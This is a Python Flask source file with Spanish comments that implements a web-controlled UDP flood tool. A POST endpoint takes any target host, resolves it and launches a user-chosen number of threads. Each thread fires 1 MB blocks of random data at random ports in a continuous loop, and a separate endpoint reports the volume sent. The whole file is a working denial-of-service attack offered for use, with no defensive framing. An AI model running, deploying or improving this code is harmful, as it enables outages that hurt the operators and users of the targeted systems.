import threading
import time
import random
import socket
import os
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# --- Variables Globales ---
bots_activos = False
stats = {"total_mb": 0, "hilos": 0, "ip": "0.0.0.0"}

# Generamos el paquete de datos una sola vez fuera del loop para no trabar la CPU
# Usamos 1MB como bloque base para que sea ultra rápido de enviar
DATA_BLOQUE = random._urandom(1024 * 1024) 

def flood_engine(target_ip):
    global bots_activos, stats
    stats["hilos"] += 1
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while bots_activos:
        try:
            # Enviamos el bloque 100 veces (100 MB por ciclo)
            for _ in range(100):
                if not bots_activos: break
                # Disparo a puerto aleatorio
                sock.sendto(DATA_BLOQUE, (target_ip, random.randint(1, 65535)))
            
            stats["total_mb"] += 100
        except:
            # Si el socket se satura, le damos un respiro de milisegundos
            time.sleep(0.01)
            
    stats["hilos"] -= 1

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/control', methods=['POST'])
def control():
    global bots_activos, stats
    data = request.json
    if data.get("action") == "start":
        if bots_activos: return jsonify({"status": "BUSY"})
        
        target = data.get("target").strip().replace("http://", "").replace("https://", "").split("/")[0]
        try:
            target_ip = socket.gethostbyname(target)
            stats["ip"] = target_ip
            bots_activos = True
            threads = int(data.get("threads", 1))
            
            for _ in range(threads):
                threading.Thread(target=flood_engine, args=(target_ip,), daemon=True).start()
            return jsonify({"status": "OK"})
        except:
            return jsonify({"status": "IP_ERROR"})
    
    bots_activos = False
    return jsonify({"status": "STOPPED"})

@app.route('/api/stats')
def get_stats():
    return jsonify(stats)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, threaded=True) # threaded=True evita que la web se congele
